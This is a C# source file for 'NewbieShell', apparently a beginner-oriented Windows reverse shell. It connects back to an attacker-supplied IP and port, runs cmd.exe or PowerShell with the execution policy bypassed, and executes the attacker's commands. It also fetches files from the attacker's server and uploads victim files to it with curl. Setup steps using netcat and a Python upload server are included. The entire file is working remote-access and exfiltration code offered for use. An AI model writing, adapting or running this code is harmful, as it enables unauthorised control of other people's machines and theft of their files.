﻿using System;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text;

namespace NewbieShell
{
    /// <summary>
    /// A Reverse - Shell - Programm for Newbies.
    /// 
    /// Newbieshell.exe [ip] [port] [cmd.exe or powershell.exe]
    /// Example: NewbieShell.exe 192.168.0.1 80 cmd.exe
    /// </summary>

    class Program
    {
        static StreamWriter sw;
        static string ip;
        static string path = @"C:\temp";

        static void Main(string[] args)
        {
            /// if no args, then question
            if (args.Length > 0)
            {
                /// Powershell.exe
                if (args[2] == "powershell.exe")
                {
                    Console.WriteLine("Execute Powershell");
                    ip = args[0];
                    Connection(args[0], Convert.ToInt32(args[1]), "powershell.exe");
                }
                /// cmd.exe
                else
                {
                    Console.WriteLine("Execute cmd.exe");
                    Connection(args[0], Convert.ToInt32(args[1]), "cmd.exe");
                }
            }
            else
            {
                Console.Write("Attacker IP Address: ");

                ip = Console.ReadLine().ToString();
                int port = 0;

                if (ip == null || ip == "")
                {
                    Console.WriteLine("Error: No IP-Address");
                }
                else
                {
                    Console.Write("Attacker Port: ");
                    port = Convert.ToInt32(Console.ReadLine());

                    if (port != 0)
                    {
                        Console.Write("Press 0 for 'cmd shell' or 1 for 'powershell' ");
                        string shell = Console.ReadLine();
                        string command = string.Empty;

                        if (shell == "0")
                        {
                            command = "cmd.exe";
                        }
                        else if (shell == "1")
                        {
                            command = "powershell.exe";
                        }
                        else
                        {
                            command = "cmd.exe";
                        }

                        Console.WriteLine(string.Format("Start Netcat with this command 'nc -vlnp {0}' on the attacker PC: ", port));
                        Console.Write("Press a button");
                        Console.ReadLine();

                        Connection(ip, port, command);
                    }
                    else
                    {
                        Console.WriteLine("Error: No port");
                    }
                }
            }
        }

        /// <summary>
        /// Print data on the attacker screen.
        /// </summary>
        /// <param name="sendingProcess"></param>
        /// <param name="outLine"></param>
        private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            StringBuilder sb = new StringBuilder();

            if (!String.IsNullOrEmpty(outLine.Data))
            {
                if (outLine.Data.IndexOf('>') > 0 && outLine.Data.Contains("C:\\"))
                {
                    //path = outLine.Data.Substring(0, outLine.Data.LastIndexOf('>'));
                }

                try
                {
                    sb.Append(outLine.Data);
                    sw.WriteLine(sb);
                    sw.Flush();
                }
                catch (Exception err)
                {
                    Console.WriteLine(err);
                }
            }
        }

        /// <summary>
        /// Connection
        /// </summary>
        /// <param name="ip">IP - Address</param>
        /// <param name="port">Port</param>
        /// <param name="command">Process - Command</param>
        private static void Connection(string ip, int port, string command)
        {
            try
            {
                // TCP - Connection
                using (TcpClient client = new TcpClient(ip, port))
                {
                    // Get the stream
                    using (var stream = client.GetStream())
                    {
                        // Streamreader
                        using (StreamReader rdr = new StreamReader(stream))
                        {

                            StringBuilder sb = new StringBuilder();

                            sw = new StreamWriter(stream);
                            sw.WriteLine("Welcome to Newbie - Shell");
                            sw.Flush();

                            Console.WriteLine("Connected");

                            Process process = new Process();
                            process.StartInfo.FileName = command;

                            //When the command is powershell.exe then write as argument "-ep bypass" to bypass the Powershell
                            // Execution Policy
                            if (command == "powershell.exe")
                            {
                                process.StartInfo.Arguments = "-ep bypass";
                            }

                            process.StartInfo.CreateNoWindow = true;
                            process.StartInfo.UseShellExecute = false;
                            process.StartInfo.RedirectStandardOutput = true;
                            process.StartInfo.RedirectStandardInput = true;
                            process.StartInfo.RedirectStandardError = true;
                            process.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);

                            try
                            {
                                process.Start();
                                process.BeginOutputReadLine();
                                process.StandardInput.WriteLine("mkdir C:\\temp");
                                sw.WriteLine("Newbie - Shell create a folder with the name C:\\temp");
                                sw.Flush();

                            }
                            catch (Exception ex)
                            {

                                Console.WriteLine(ex.Message);
                                process.WaitForExit();
                                client.Close();
                                Environment.Exit(0);
                            }
                           
                            //If the attacker writes something into the terminal, then this command is executed at the victim.
                            while (true)
                            {
                                try
                                {
                                    //Read command from terminal.
                                    sb.Append(rdr.ReadLine());

                                    //The #D - Command stands for "Download". The Attacker can download the data from a web server. 
                                    //Therefore the system takes the IP - Address from the Reverse Shell and the port 80. 
                                    if (sb.ToString().ToUpper() == "#D")
                                    {
                                        //To save the actual path
                                        //process.StandardInput.WriteLine("dir");

                                        sb.Remove(0, sb.Length);

                                        sw = new StreamWriter(stream);
                                        sw.Write("Name of the Downloaded File: ");
                                        sw.Flush();

                                        sb.Append(rdr.ReadLine());
                                        WebClient myWebClient = new WebClient();
                                        string webresource = "http://" + ip + "/" + sb.ToString();
                                        myWebClient.DownloadFile(webresource, path + "\\" + sb.ToString());
                                        myWebClient.Dispose();

                                        sw.WriteLine(string.Format("{0} - File is downloaded on {1}", webresource, path));
                                        sw.Flush();
                                        sb.Remove(0, sb.Length);
                                    }
                                    // Upload file to the Attacker with CURL. The Attacker can upload the file from the Victim to a Webserver.
                                    // Therefore the system takes the IP - Address from the Reverse Shell and the port 80.
                                    // Install the uploadserver "pip3 install uploadserver" and start it with the Command "python3 -m uploadserver 80" on the Attacker Machine.
                                    // Works only with cmd.exe not with powershell.exe
                                    else if (sb.ToString().ToUpper() == "#U")
                                    {
                                        //To save the actual path
                                        //process.StandardInput.WriteLine("dir");

                                        string cmd = string.Empty;
                                        string filename = string.Empty;
                                        string websource = string.Empty;

                                        sb.Remove(0, sb.Length);
                                        sw = new StreamWriter(stream);
                                        sw.WriteLine("Install the uploadserver \"pip3 install uploadserver\" on the Attacker Machine");
                                        sw.WriteLine("Start the the uploadserver with this command \"python3 - m uploadserver 80\" on the Attacker Machine");
                                        sw.Write("Full path of the uploaded file: ");
                                        sw.Flush();

                                        //Upload with powershell.exe
                                        if (command == "powershell.exe")
                                        { 
                                            filename = rdr.ReadLine();
                                            websource = "http://" + ip + "/upload";
                                            string curlcommand = "curl -F files=@" + filename + " " + websource;
                                            cmd = "cmd /c " + curlcommand;

                                        }
                                        //Upload with cmd.exe
                                        else
                                        {
                                            filename = rdr.ReadLine();
                                            websource = "http://" + ip + "/upload";
                                            cmd = "curl -F files=@" + filename + " " + websource;
                                        }

                                        try
                                        {
                                            process.StandardInput.WriteLine(cmd);
                                            sw.WriteLine(string.Format("{0} - File is uploaded on {1}", filename, websource));
                                            sw.Flush();
                                        }
                                        catch (Exception ex)
                                        {
                                            sw.WriteLine(ex.Message);
                                            sw.Flush();
                                            Console.WriteLine(ex.Message);
                                        }
                                    }
                                    // Help - File
                                    else if (sb.ToString().ToUpper() == "#H")
                                    {
                                        sw.WriteLine("#D ------> Download file from Attacker! Start python3 -m http.server 80 on the attacker machine");
                                        sw.WriteLine("#U ------> Upload file to the Attacker! Install the uploadserver \"pip3 install uploadserver\" and start it with the Command \"python3 -m uploadserver 80\")");
                                        sw.WriteLine("#H ------> Help");
                                        sw.Flush();
                                        sb.Remove(0, sb.Length);
                                    }
                                    else
                                    {
                                        try
                                        {
                                            process.StandardInput.WriteLine(sb);
                                            sb.Remove(0, sb.Length);
                                        }
                                        catch (Exception ex)
                                        {
                                            Console.WriteLine(ex.Message);
                                            process.WaitForExit();
                                            client.Close();
                                            Environment.Exit(0);
                                        }
                                    }

                                }
                                // Exception error
                                catch (Exception ex)
                                {
                                    Console.WriteLine(ex.Message);
                                    process.WaitForExit();
                                    client.Close();
                                    Environment.Exit(0);
                                }
                            }
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
                Environment.Exit(0);
            }

        }
    }
}
